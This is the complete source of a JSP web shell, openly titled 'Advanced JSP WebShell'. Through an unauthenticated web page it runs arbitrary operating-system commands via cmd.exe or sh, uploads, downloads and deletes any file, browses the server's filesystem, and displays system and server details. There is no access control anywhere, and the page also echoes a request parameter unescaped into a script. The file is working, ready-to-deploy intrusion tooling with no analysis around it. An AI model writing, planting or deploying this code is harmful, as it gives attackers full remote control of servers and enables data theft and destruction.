<%@ page import="java.util.*,java.io.*,java.nio.file.*" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%
// Full Featured JSP WebShell
String action = request.getParameter("action") != null ? request.getParameter("action") : "cmd";
String currentDir = System.getProperty("user.dir");
String userHome = System.getProperty("user.home");

// Handle file upload (manual implementation without Apache Commons)
if("upload".equals(action) && "POST".equalsIgnoreCase(request.getMethod())) {
    try {
        String uploadPath = request.getParameter("uploadPath") != null ? 
                           request.getParameter("uploadPath") : currentDir;
        
        // Manual multipart form data processing
        ServletInputStream inputStream = request.getInputStream();
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        
        byte[] data = new byte[8192];
        int bytesRead;
        while ((bytesRead = inputStream.read(data, 0, data.length)) != -1) {
            buffer.write(data, 0, bytesRead);
        }
        
        byte[] requestData = buffer.toByteArray();
        String boundary = request.getContentType().split("boundary=")[1];
        
        // Simple file extraction (basic implementation)
        String fileContent = new String(requestData);
        String[] parts = fileContent.split("--" + boundary);
        
        for (String part : parts) {
            if (part.contains("filename=")) {
                // Extract filename
                int filenameIndex = part.indexOf("filename=");
                if (filenameIndex != -1) {
                    int start = filenameIndex + 10;
                    int end = part.indexOf("\"", start);
                    String filename = part.substring(start, end);
                    
                    if (!filename.isEmpty()) {
                        // Extract file content
                        int contentStart = part.indexOf("\r\n\r\n") + 4;
                        int contentEnd = part.lastIndexOf("\r\n");
                        
                        if (contentStart != -1 && contentEnd != -1 && contentStart < contentEnd) {
                            byte[] fileBytes = Arrays.copyOfRange(
                                requestData, 
                                contentStart, 
                                contentEnd
                            );
                            
                            File uploadedFile = new File(uploadPath, filename);
                            Files.write(uploadedFile.toPath(), fileBytes);
                            out.println("<p style='color:green'>File uploaded successfully: " + uploadedFile.getAbsolutePath() + "</p>");
                        }
                    }
                }
            }
        }
    } catch(Exception e) {
        out.println("<p style='color:red'>Upload error: " + e.getMessage() + "</p>");
        e.printStackTrace(new PrintWriter(out));
    }
}

// Handle file download
if("download".equals(action) && request.getParameter("file") != null) {
    String filePath = request.getParameter("file");
    try {
        File file = new File(filePath);
        if (file.exists() && file.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            response.setContentLength((int) file.length());
            
            Files.copy(file.toPath(), response.getOutputStream());
            response.getOutputStream().flush();
            return;
        } else {
            out.println("<p style='color:red'>File not found: " + filePath + "</p>");
        }
    } catch(Exception e) {
        out.println("<p style='color:red'>Download error: " + e.getMessage() + "</p>");
    }
}

// Handle file deletion
if("delete".equals(action) && request.getParameter("file") != null) {
    String filePath = request.getParameter("file");
    try {
        File file = new File(filePath);
        if (file.exists()) {
            if (file.delete()) {
                out.println("<p style='color:green'>File deleted successfully: " + filePath + "</p>");
            } else {
                out.println("<p style='color:red'>Failed to delete file: " + filePath + "</p>");
            }
        } else {
            out.println("<p style='color:red'>File not found: " + filePath + "</p>");
        }
    } catch(Exception e) {
        out.println("<p style='color:red'>Delete error: " + e.getMessage() + "</p>");
    }
}

// Handle command execution with improved output
if("cmd".equals(action) && request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    try {
        // Determine OS and use appropriate command processor
        String os = System.getProperty("os.name").toLowerCase();
        Process p;
        
        if (os.contains("win")) {
            // Windows
            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        } else {
            // Unix/Linux/Mac
            p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        }
        
        // Read output streams
        BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
        BufferedReader stderr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
        
        // Wait for process to complete
        p.waitFor();
        
        out.println("<h3>Command: " + cmd + "</h3>");
        
        // Read and display stdout
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = stdout.readLine()) != null) {
            output.append(line).append("\n");
        }
        
        if (output.length() > 0) {
            out.println("<h4>Output:</h4><pre>");
            out.println(output.toString());
            out.println("</pre>");
        } else {
            out.println("<h4>Output:</h4><pre>No output</pre>");
        }
        
        // Read and display stderr
        StringBuilder error = new StringBuilder();
        while ((line = stderr.readLine()) != null) {
            error.append(line).append("\n");
        }
        
        if (error.length() > 0) {
            out.println("<h4>Errors:</h4><pre style='color:red'>");
            out.println(error.toString());
            out.println("</pre>");
        }
        
        // Show exit code
        out.println("<h4>Exit Code: " + p.exitValue() + "</h4>");
        
    } catch(Exception e) {
        out.println("<p style='color:red'>Error: " + e.getMessage() + "</p>");
        e.printStackTrace(new PrintWriter(out));
    }
} 

// Handle file browsing
else if("browse".equals(action)) {
    String path = request.getParameter("path") != null ? request.getParameter("path") : currentDir;
    try {
        File dir = new File(path);
        if (!dir.exists()) {
            out.println("<p style='color:red'>Directory does not exist: " + path + "</p>");
            path = currentDir;
            dir = new File(path);
        }
        
        out.println("<h3>Directory: " + dir.getAbsolutePath() + "</h3>");
        
        // Navigation breadcrumbs
        out.println("<div style='margin-bottom: 10px;'>");
        out.println("<strong>Path: </strong>");
        File current = dir;
        List<String> pathParts = new ArrayList<>();
        while (current != null) {
            pathParts.add(0, current.getName());
            current = current.getParentFile();
        }
        
        String currentPath = "";
        for (int i = 0; i < pathParts.size(); i++) {
            if (i > 0) currentPath += File.separator + pathParts.get(i);
            else currentPath = pathParts.get(i);
            
            if (i == 0 && pathParts.get(0).isEmpty()) {
                out.println("<a href='?action=browse&path=/'>/</a>");
            } else {
                out.println("<a href='?action=browse&path=" + java.net.URLEncoder.encode(currentPath, "UTF-8") + "'>" + 
                           (i == 0 ? "Root" : pathParts.get(i)) + "</a>");
            }
            if (i < pathParts.size() - 1) out.println(" / ");
        }
        out.println("</div>");
        
        out.println("<table border='1' style='width:100%;'><tr><th>Name</th><th>Size</th><th>Modified</th><th>Permissions</th><th>Actions</th></tr>");
        
        // Parent directory link
        if (dir.getParent() != null) {
            out.println("<tr>");
            out.println("<td><a href='?action=browse&path=" + java.net.URLEncoder.encode(dir.getParent(), "UTF-8") + "'>[..]</a></td>");
            out.println("<td>-</td>");
            out.println("<td>-</td>");
            out.println("<td>-</td>");
            out.println("<td>-</td>");
            out.println("</tr>");
        }
        
        File[] files = dir.listFiles();
        if (files != null) {
            for(File file : files) {
                out.println("<tr>");
                String fileName = file.getName();
                if (file.isDirectory()) {
                    out.println("<td><a href='?action=browse&path=" + java.net.URLEncoder.encode(file.getAbsolutePath(), "UTF-8") + "'>[DIR] " + fileName + "</a></td>");
                } else {
                    out.println("<td>" + fileName + "</td>");
                }
                out.println("<td>" + (file.isFile() ? file.length() + " bytes" : "-") + "</td>");
                out.println("<td>" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified())) + "</td>");
                out.println("<td>" + (file.canRead() ? "r" : "-") + (file.canWrite() ? "w" : "-") + (file.canExecute() ? "x" : "-") + "</td>");
                out.println("<td>");
                if (file.isFile()) {
                    out.println("<a href='?action=download&file=" + java.net.URLEncoder.encode(file.getAbsolutePath(), "UTF-8") + "'>Download</a> | ");
                    out.println("<a href='?action=delete&file=" + java.net.URLEncoder.encode(file.getAbsolutePath(), "UTF-8") + "' onclick='return confirm(\"Are you sure you want to delete " + fileName + "?\")'>Delete</a>");
                }
                out.println("</td>");
                out.println("</tr>");
            }
        }
        out.println("</table>");
    } catch(Exception e) {
        out.println("<p style='color:red'>Error browsing: " + e.getMessage() + "</p>");
        e.printStackTrace(new PrintWriter(out));
    }
}
%>
<html>
<head>
    <title>Advanced JSP WebShell</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .tab { margin-bottom: 20px; }
        .tab button { 
            padding: 10px 20px; 
            margin-right: 5px; 
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .tab button:hover { background-color: #45a049; }
        .tabcontent { 
            display: none; 
            padding: 20px; 
            border: 1px solid #ccc; 
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        pre { 
            background: #f4f4f4; 
            padding: 10px; 
            overflow: auto;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        table { 
            border-collapse: collapse; 
            width: 100%;
            margin-top: 10px;
        }
        th, td { 
            padding: 8px; 
            text-align: left; 
            border: 1px solid #ddd; 
        }
        th { 
            background-color: #f2f2f2; 
        }
        a { 
            text-decoration: none; 
            color: #0066cc; 
        }
        a:hover { 
            text-decoration: underline; 
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <h1 style="color: #333;">JSP WebShell</h1>
    
    <div class="tab">
        <button onclick="openTab('cmd')">Command Execution</button>
        <button onclick="openTab('browse')">File Browser</button>
        <button onclick="openTab('upload')">File Upload</button>
        <button onclick="openTab('info')">System Info</button>
    </div>

    <div id="cmd" class="tabcontent">
        <h2>Command Execution</h2>
        <form method="get">
            <input type="hidden" name="action" value="cmd">
            <textarea name="cmd" rows="3" cols="80" placeholder="Enter command..."><%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "whoami; pwd; ls -la" %></textarea><br>
            <input type="submit" value="Execute">
        </form>
        <%
        if("cmd".equals(action) && request.getParameter("cmd") != null) {
            // Command output will be displayed here
        }
        %>
    </div>

    <div id="browse" class="tabcontent">
        <h2>File Browser</h2>
        <form method="get">
            <input type="hidden" name="action" value="browse">
            Path: <input type="text" name="path" size="60" value="<%= request.getParameter("path") != null ? request.getParameter("path") : currentDir %>">
            <input type="submit" value="Browse">
        </form>
        <%
        if("browse".equals(action)) {
            // File browser content will be displayed here
        }
        %>
    </div>

    <div id="upload" class="tabcontent">
        <h2>File Upload</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            Upload to directory: <br>
            <input type="text" name="uploadPath" size="60" value="<%= currentDir %>"><br><br>
            Select file: <br>
            <input type="file" name="file"><br><br>
            <input type="submit" value="Upload File">
        </form>
        <p><strong>Note:</strong> This is a basic file upload implementation. For large files, consider using Apache Commons FileUpload.</p>
    </div>

    <div id="info" class="tabcontent">
        <h2>System Information</h2>
        <pre>
OS: <%= System.getProperty("os.name") %> <%= System.getProperty("os.version") %>
Arch: <%= System.getProperty("os.arch") %>
User: <%= System.getProperty("user.name") %>
Home: <%= userHome %>
Current Dir: <%= currentDir %>
Java: <%= System.getProperty("java.version") %>
Server: <%= application.getServerInfo() %>
Servlet Version: <%= application.getMajorVersion() %>.<%= application.getMinorVersion() %>
        </pre>
    </div>

    <script>
        function openTab(tabName) {
            var i, tabcontent;
            tabcontent = document.getElementsByClassName("tabcontent");
            for (i = 0; i < tabcontent.length; i++) {
                tabcontent[i].style.display = "none";
            }
            document.getElementById(tabName).style.display = 'block';
        }
        
        // Show the appropriate tab based on current action
        var currentAction = '<%= action %>';
        if (currentAction === 'browse') {
            document.getElementById('browse').style.display = 'block';
        } else if (currentAction === 'upload') {
            document.getElementById('upload').style.display = 'block';
        } else {
            document.getElementById('cmd').style.display = 'block';
        }
    </script>
</body>
</html>
